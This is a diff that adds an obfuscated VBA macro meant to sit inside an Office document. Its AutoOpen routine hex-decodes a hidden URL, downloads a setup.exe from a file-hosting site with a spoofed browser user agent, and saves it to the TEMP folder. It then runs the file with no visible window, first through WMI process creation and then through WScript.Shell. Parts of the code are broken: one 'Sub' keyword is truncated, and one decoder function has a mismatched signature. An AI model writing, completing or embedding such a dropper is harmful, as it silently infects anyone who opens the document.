@@ -1,0 +1,75 @@
+Private Sub ohhvkedxvu()
+  Dim oocoyeahjpg As String
+  Dim usfobdjprhtsr As String
+  Dim vnrmyogpboqyaytxits As Object, wqywvjylez As Object
+  Dim wvgdxqgtzslhmhftjinl As Integer
+  oocoyeahjpg = wgclmhbfhpfo("68747470733a2f2f7331382e7069636f66696c652e636f6d2f642f383433363937353439322f34") & wgclmhbfhpfo("626334303636632d336638322d343533642d386365362d3861313233316566306164612f73657475702e657865")
+  usfobdjprhtsr = wgclmhbfhpfo("6173") & wgclmhbfhpfo("6173617361")
+  usfobdjprhtsr = Environ("TEMP") & "\" & usfobdjprhtsr
+  Set vnrmyogpboqyaytxits = CreateObject(wgclmhbfhpfo("4d53584d4c322e536572766572584d4c485454") & wgclmhbfhpfo("502e362e30"))
+  vnrmyogpboqyaytxits.setOption(2) = 13056
+  vnrmyogpboqyaytxits.Open wgclmhbfhpfo("474554"), oocoyeahjpg, False
+  vnrmyogpboqyaytxits.setRequestHeader wgclmhbfhpfo("557365722d4167656e") & wgclmhbfhpfo("74"), wgclmhbfhpfo("4d6f7a696c6c612f342e302028636f6d70617469626c653b204d53494520") & wgclmhbfhpfo("362e303b2057696e646f7773204e5420352e3029")
+  vnrmyogpboqyaytxits.Send
+  If vnrmyogpboqyaytxits.Status = 200 Then
+    Set wqywvjylez = CreateObject(wgclmhbfhpfo("41444f44") & wgclmhbfhpfo("422e53747265616d"))
+    wqywvjylez.Open
+    wqywvjylez.Type = 1
+    wqywvjylez.Write vnrmyogpboqyaytxits.ResponseBody
+    wqywvjylez.SaveToFile usfobdjprhtsr, 2
+    wqywvjylez.Close
+    cfazgkeakbwejxhyc usfobdjprhtsr
+  End If
+End Sub
+Sub AutoOpen()
+  ohhvkedxvu
+End Sub
+Private Function wgclmhbfhpfo(ByVal sovbqyxgqbwv As String, id_FFFE As String) As String
+  Dim ygyoawbrgbay As Long
+  For ygyoawbrgbay = 1 To Len(sovbqyxgqbwv) Step 2
+    wgclmhbfhpfo = wgclmhbfhpfo & Chr$(Val("&H" & Mid$(sovbqyxgqbwv, ygyoawbrgbay, 2)))
+  Next ygyoawbrgbay
+End Function
+
+Function buqtqookqucv(cmdLine As String) As Integer
+  Dim bigwcqcixtugqamko As Object
+  Dim fzmxhdgrubdqodyomm As Object
+  Set qomaarywqjrflqswv = GetObject(gncecjftozad("77696e6d676d") & gncecjftozad("74733a5c5c2e5c726f6f745c63696d7632"))
+  Set kztsptfaiwxy = qomaarywqjrflqswv.Get(gncecjftozad("57696e33325f50726f63657373") & gncecjftozad("53746172747570"))
+  Set bigwcqcixtugqamko = kztsptfaiwxy.SpawnInstance_
+  bigwcqcixtugqamko.ShowWindow = 0
+  Set fzmxhdgrubdqodyomm = GetObject(gncecjftozad("77696e6d676d74733a5c5c") & gncecjftozad("2e5c726f6f745c63696d76323a57696e33325f50726f63657373"))
+  buqtqookqucv = ommgvfbxgbujus(fzmxhdgrubdqodyomm, bigwcqcixtugqamko, cmdLine)
+End Function
+Private Function ommgvfbxgbujus(pkfwqzxqbmh As Object, qvymespmeaikorb As Object, zpmsacfqrbnkuptixycv As String) As Integer
+  Dim evlugplgmuxnpxqqvjyw As Long
+  ommgvfbxgbujus = pkfwqzxqbmh.Create(zpmsacfqrbnkuptixycv, Null, qvymespmeaikorb, evlugplgmuxnpxqqvjyw)
+End Function
+Private Function gncecjftozad(ByVal brxkbkganhap As String) As String
+  Dim zzmawkbceitq As Long
+  For zzmawkbceitq = 1 To Len(brxkbkganhap) Step 2
+    gncecjftozad = gncecjftozad & Chr$(Val("&H" & Mid$(brxkbkganhap, zzmawkbceitq, 2)))
+  Next zzmawkbceitq
+End Function
+
+ub cfazgkeakbwejxhyc(yijdmndxbqagrirkzw As String)
+  On Error Resume Next
+  Err.Clear
+  wimResult = buqtqookqucv(yijdmndxbqagrirkzw)
+  If Err.Number <> 0 Or wimResult <> 0 Then
+    Err.Clear
+    esjzcclvjjlqjlwsu yijdmndxbqagrirkzw
+  End If
+  On Error GoTo 0
+End Sub
+
+Sub esjzcclvjjlqjlwsu(niegshsvdfwwqzntoom As String)
+  CreateObject(ulaapramnzax("57") & ulaapramnzax("5363726970742e5368656c6c")).Run niegshsvdfwwqzntoom, 0
+End Sub
+Private Function ulaapramnzax(ByVal arauwmmpchim As String) As String
+  Dim tedinnplitgn As Long
+  For tedinnplitgn = 1 To Len(arauwmmpchim) Step 2
+    ulaapramnzax = ulaapramnzax & Chr$(Val("&H" & Mid$(arauwmmpchim, tedinnplitgn, 2)))
+  Next tedinnplitgn
+End Function
+
